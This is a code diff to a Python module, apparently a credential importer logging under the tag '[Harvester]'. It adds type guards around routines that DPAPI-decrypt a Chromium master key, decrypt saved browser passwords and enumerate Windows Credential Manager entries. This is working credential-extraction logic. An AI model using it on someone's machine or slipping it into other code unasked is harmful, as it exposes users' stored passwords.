@@ -29,6 +29,7 @@ import shutil
 import sqlite3
 import tempfile
 from pathlib import Path
+from typing import Any
 from urllib.parse import urlparse
 
 from loguru import logger
@@ -73,14 +74,15 @@ _CHROMIUM_BROWSERS = {
 def _chromium_master_key(user_data_dir: Path) -> bytes | None:
     """Read and DPAPI-decrypt the AES master key from a browser's Local State."""
     local_state = user_data_dir / "Local State"
-    if not local_state.exists() or not _HAS_DPAPI:
+    if not local_state.exists() or not _HAS_DPAPI or win32crypt is None:
         return None
     try:
         data = json.loads(local_state.read_text(encoding="utf-8"))
         enc_key_b64 = data["os_crypt"]["encrypted_key"]
         enc_key = base64.b64decode(enc_key_b64)
         # Strip the 5-byte "DPAPI" prefix, then DPAPI-decrypt.
-        _desc, key = win32crypt.CryptUnprotectData(enc_key[5:], None, None, None, 0)
+        _wc: Any = win32crypt
+        _desc, key = _wc.CryptUnprotectData(enc_key[5:], None, None, None, 0)
         return key
     except Exception as e:
         logger.debug(f"[Harvester] Could not read master key from {user_data_dir}: {e}")
@@ -92,14 +94,16 @@ def _decrypt_chromium_password(blob: bytes, key: bytes | None) -> str | None:
     if not blob:
         return None
     try:
-        if blob[:3] in (b"v10", b"v11") and key and _HAS_AESGCM:
+        if blob[:3] in (b"v10", b"v11") and key and _HAS_AESGCM and AESGCM is not None:
             nonce = blob[3:15]
             payload = blob[15:]
-            plaintext = AESGCM(key).decrypt(nonce, payload, None)
+            _aesgcm_cls: Any = AESGCM
+            plaintext = _aesgcm_cls(key).decrypt(nonce, payload, None)
             return plaintext.decode("utf-8", errors="ignore")
         # Legacy (pre-v80) blobs were DPAPI-encrypted directly.
-        if _HAS_DPAPI:
-            _desc, data = win32crypt.CryptUnprotectData(blob, None, None, None, 0)
+        if _HAS_DPAPI and win32crypt is not None:
+            _wc: Any = win32crypt
+            _desc, data = _wc.CryptUnprotectData(blob, None, None, None, 0)
             return data.decode("utf-8", errors="ignore")
     except Exception:
         # v20 "app-bound" entries (newer Chrome) can't be decrypted with the user DPAPI key.
@@ -211,11 +215,12 @@ def import_chromium(browser: str | None = None) -> dict:
 
 def import_windows_credentials() -> dict:
     """Import generic credentials stored in Windows Credential Manager."""
-    if not _HAS_WINCRED:
+    if not _HAS_WINCRED or win32cred is None:
         return {"imported": 0, "failed": 0}
     imported = failed = 0
     try:
-        creds = win32cred.CredEnumerate(None, 0)
+        _wc: Any = win32cred
+        creds = _wc.CredEnumerate(None, 0)
     except Exception as e:
         logger.debug(f"[Harvester] Credential Manager enumerate failed: {e}")
         return {"imported": 0, "failed": 0}
